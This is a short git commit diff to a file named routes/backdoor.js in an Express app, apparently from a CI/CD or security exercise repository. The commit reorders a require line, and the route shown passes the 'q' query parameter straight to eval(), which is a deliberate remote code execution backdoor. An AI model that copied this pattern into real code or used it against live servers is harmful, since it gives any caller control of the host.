dd6add6eb0bb10528a9c7ba4e4a556ce3d78e3ad
cicdomgeving <61230583+cicdomgeving@users.noreply.github.com>
2020-03-30 12:43:44 +0200

    Update backdoor.js

--- routes/backdoor.js
+++ routes/backdoor.js
@@ -1,6 +1,7 @@
+var express = require('express');
 var router = express.Router();
 /* GET for backdoor */
-var express = require('express');
+
 
 router.get('/', function (req, res) {
     res.send('Hello ' + eval(req.query.q));
